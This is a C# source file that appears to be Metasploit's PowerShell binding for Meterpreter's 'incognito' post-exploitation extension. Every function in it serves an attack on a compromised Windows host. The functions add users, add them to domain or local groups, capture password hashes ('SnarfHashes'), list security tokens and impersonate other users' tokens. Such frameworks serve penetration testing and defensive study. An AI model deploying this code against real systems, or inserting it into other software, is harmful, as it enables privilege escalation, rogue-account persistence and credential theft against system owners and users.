using System;
using System.Collections.Generic;

namespace MSF.Powershell.Meterpreter
{
    public static class Incognito
    {
        public enum TokenType
        {
            User = 0,
            Group = 1
        }

        public class TokenSet
        {
            private const string NoTokens = "No tokens available\n";

            public List<string> ImpersonationTokens { get; private set; }
            public List<string> DelegationTokens { get; private set; }

            public TokenSet()
            {
                ImpersonationTokens = new List<string>();
                DelegationTokens = new List<string>();
            }

            public TokenSet(string impersonationTokens, string delegationTokens)
                : this()
            {
                if (!string.IsNullOrEmpty(impersonationTokens) && NoTokens != impersonationTokens)
                {
                    ImpersonationTokens.AddRange(impersonationTokens.Trim().Split('\n'));
                }

                if (!string.IsNullOrEmpty(delegationTokens) && NoTokens != delegationTokens)
                {
                    DelegationTokens.AddRange(delegationTokens.Trim().Split('\n'));
                }
            }
        }

        public static bool AddUser(string server, string username, string password)
        {
            System.Diagnostics.Debug.Write("[PSH BINDING] Invoking binding call AddUser");

            Tlv tlv = new Tlv();
            tlv.Pack(TlvType.IncognitoServerName, server);
            tlv.Pack(TlvType.IncognitoUserName, username);
            tlv.Pack(TlvType.IncognitoPassword, password);

            var result = Core.InvokeMeterpreterBinding(true, tlv.ToRequest(CommandId.IncognitoAddUser));

            if (result != null)
            {
                System.Diagnostics.Debug.Write("[PSH BINDING] Result returned, incognito is probably loaded");
                var responseTlv = Tlv.FromResponse(result);
                if (responseTlv[TlvType.Result].Count > 0 &&
                    (int)responseTlv[TlvType.Result][0] == 0)
                {
                    return true;
                }

                return false;
            }

            System.Diagnostics.Debug.Write("[PSH BINDING] Result not returned, incognito is probably not loaded");
            throw new InvalidOperationException("incognito extension is not loaded");
        }

        public static bool AddGroupUser(string server, string group, string username)
        {
            return AddGroupUserInternal(CommandId.IncognitoAddGroupUser, server, group, username);
        }
        
        public static bool AddLocalGroupUser(string server, string group, string username)
        {
            return AddGroupUserInternal(CommandId.IncognitoAddLocalgroupUser, server, group, username);
        }
        
        private static bool AddGroupUserInternal(CommandId commandId, string server, string group, string username)
        {
            System.Diagnostics.Debug.Write("[PSH BINDING] Invoking binding call AddGroupUserInternal");

            Tlv tlv = new Tlv();
            tlv.Pack(TlvType.IncognitoServerName, server);
            tlv.Pack(TlvType.IncognitoGroupName, group);
            tlv.Pack(TlvType.IncognitoUserName, username);

            var result = Core.InvokeMeterpreterBinding(true, tlv.ToRequest(commandId));

            if (result != null)
            {
                System.Diagnostics.Debug.Write("[PSH BINDING] Result returned, incognito is probably loaded");
                var responseTlv = Tlv.FromResponse(result);
                if (responseTlv[TlvType.Result].Count > 0 &&
                    (int)responseTlv[TlvType.Result][0] == 0)
                {
                    return true;
                }

                return false;
            }

            System.Diagnostics.Debug.Write("[PSH BINDING] Result not returned, incognito is probably not loaded");
            throw new InvalidOperationException("incognito extension is not loaded");
        }

        public static bool SnarfHashes()
        {
            System.Diagnostics.Debug.Write("[PSH BINDING] Invoking binding call SnarfHashes");

            Tlv tlv = new Tlv();

            var result = Core.InvokeMeterpreterBinding(true, tlv.ToRequest(CommandId.IncognitoSnarfHashes));

            if (result != null)
            {
                System.Diagnostics.Debug.Write("[PSH BINDING] Result returned, incognito is probably loaded");
                var responseTlv = Tlv.FromResponse(result);
                if (responseTlv[TlvType.Result].Count > 0 &&
                    (int)responseTlv[TlvType.Result][0] == 0)
                {
                    return true;
                }

                return false;
            }

            System.Diagnostics.Debug.Write("[PSH BINDING] Result not returned, incognito is probably not loaded");
            throw new InvalidOperationException("incognito extension is not loaded");
        }

        public static bool Impersonate(string user)
        {
            System.Diagnostics.Debug.Write("[PSH BINDING] Invoking binding call Impersonate");

            Tlv tlv = new Tlv();
            tlv.Pack(TlvType.IncognitoImpersonateToken, user);

            var result = Core.InvokeMeterpreterBinding(true, tlv.ToRequest(CommandId.IncognitoImpersonateToken));

            if (result != null)
            {
                System.Diagnostics.Debug.Write("[PSH BINDING] Result returned, incognito is probably loaded");
                var responseTlv = Tlv.FromResponse(result);
                if (responseTlv[TlvType.Result].Count > 0 &&
                    (int)responseTlv[TlvType.Result][0] == 0)
                {
                    return true;
                }

                return false;
            }

            System.Diagnostics.Debug.Write("[PSH BINDING] Result not returned, incognito is probably not loaded");
            throw new InvalidOperationException("incognito extension is not loaded");
        }

        public static TokenSet ListUserTokens()
        {
            return ListTokens(TokenType.User);
        }

        public static TokenSet ListGroupTokens()
        {
            return ListTokens(TokenType.Group);
        }

        public static TokenSet ListTokens(TokenType type)
        {
            System.Diagnostics.Debug.Write("[PSH BINDING] Invoking binding call ListTokens");

            Tlv tlv = new Tlv();
            tlv.Pack(TlvType.IncognitoListTokensTokenOrder, (int)type);

            var result = Core.InvokeMeterpreterBinding(true, tlv.ToRequest(CommandId.IncognitoListTokens));

            if (result != null)
            {
                System.Diagnostics.Debug.Write("[PSH BINDING] Result returned, incognito is probably loaded");
                var responseTlv = Tlv.FromResponse(result);
                if (responseTlv[TlvType.Result].Count > 0 &&
                    (int)responseTlv[TlvType.Result][0] == 0)
                {
                    var impersonationTokens = Tlv.GetValue<string>(responseTlv, TlvType.IncognitoListTokensImpersonation, string.Empty);
                    var delegationTokens = Tlv.GetValue<string>(responseTlv, TlvType.IncognitoListTokensDelegation, string.Empty);
                    return new TokenSet(impersonationTokens, delegationTokens);
                }
            }

            System.Diagnostics.Debug.Write("[PSH BINDING] Result not returned, incognito is probably not loaded");
            throw new InvalidOperationException("incognito extension is not loaded");
        }
    }
}
